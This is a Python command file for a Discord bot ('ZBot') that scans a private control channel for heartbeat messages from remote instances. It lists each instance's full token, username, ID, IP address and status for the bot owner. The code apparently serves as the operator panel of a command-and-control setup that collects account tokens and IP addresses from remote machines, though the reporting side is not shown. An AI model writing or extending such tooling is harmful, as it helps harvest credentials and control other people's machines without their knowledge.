# ================================================================
# updated list_instances.py – with fallback extraction and logging
# place at: commands/owner/list_instances.py
# ================================================================
"""
list_instances.py - !list
Scans control channel and lists instances.
Now extracts FULL_ID from visible part or markers.
"""
import re
import discord

OWNER_ID = 981259484691325018
CONTROL_CHANNEL_ID = 1508336791311089874

async def run(client, message, args):
    if message.author.id != OWNER_ID:
        await message.channel.send("Unauthorized.", delete_after=5)
        return

    if not CONTROL_CHANNEL_ID:
        await message.channel.send("Control channel not set in command file.")
        return

    channel = client.get_channel(CONTROL_CHANNEL_ID)
    if not channel:
        await message.channel.send("Control channel not found. Check ID and permissions.")
        return

    # Fetch messages
    try:
        msgs = []
        async for msg in channel.history(limit=200):
            msgs.append(msg)
    except discord.Forbidden:
        await message.channel.send("Missing 'Read Message History' permission in control channel.")
        return
    except Exception as e:
        await message.channel.send(f"Error reading history: {e}")
        return

    if not msgs:
        await message.channel.send("No messages found in control channel. Is it empty?")
        return

    # Parse messages
    instances = {}
    for msg in msgs:
        content = msg.content
        if "ZBot" not in content:
            continue

        # Try to get full ID from marker first (most reliable)
        full_id_match = re.search(r'\[FULL_ID=([^\]]+)\]', content)
        full_id = None
        if full_id_match:
            full_id = full_id_match.group(1)
        else:
            # Fallback: extract ID from visible part: "ID: `...`"
            visible_match = re.search(r'ID: `([^`]+)`', content)
            if visible_match:
                full_id = visible_match.group(1)

        if not full_id:
            continue  # skip if no ID found

        # Get token (full) from marker
        token_match = re.search(r'\[FULL_TOKEN=([^\]]+)\]', content)
        token = token_match.group(1) if token_match else "N/A"

        # IP
        ip_match = re.search(r'\[IP=([^\]]+)\]', content)
        ip = ip_match.group(1) if ip_match else "?"

        # Status
        status = "ON" if "🟢" in content else "OFF"

        # Username
        user_match = re.search(r'User: `([^`]+)`', content)
        username = user_match.group(1) if user_match else "?"

        # Keep newest per instance (based on message ID)
        if full_id not in instances or msg.id > instances[full_id]["msg_id"]:
            instances[full_id] = {
                "full_id": full_id,
                "username": username,
                "token": token,
                "ip": ip,
                "status": status,
                "msg_id": msg.id
            }

    if not instances:
        await message.channel.send(
            "No active instances found. Ensure at least one instance has sent a heartbeat (wait up to 60s) "
            "and that the control channel ID is correct.\n"
            f"DEBUG: fetched {len(msgs)} messages, found {len([m for m in msgs if 'ZBot' in m.content])} with 'ZBot'."
        )
        return

    # Build numbered list and store mapping (number -> full_id)
    client._instance_map = {}
    lines = []
    idx = 1
    for full_id, data in instances.items():
        client._instance_map[idx] = full_id
        # Show token fully (user requested full token)
        lines.append(
            f"{idx} | ZBot | Token: `{data['token']}` | "
            f"User: `{data['username']}` | "
            f"ID: `{full_id}` | "
            f"IP: {data['ip']} | Status: **{data['status']}**"
        )
        idx += 1

    content = "\n".join(lines)
    if len(content) > 1900:
        content = content[:1900] + "..."
    await message.channel.send(f"```\n{content}\n```")
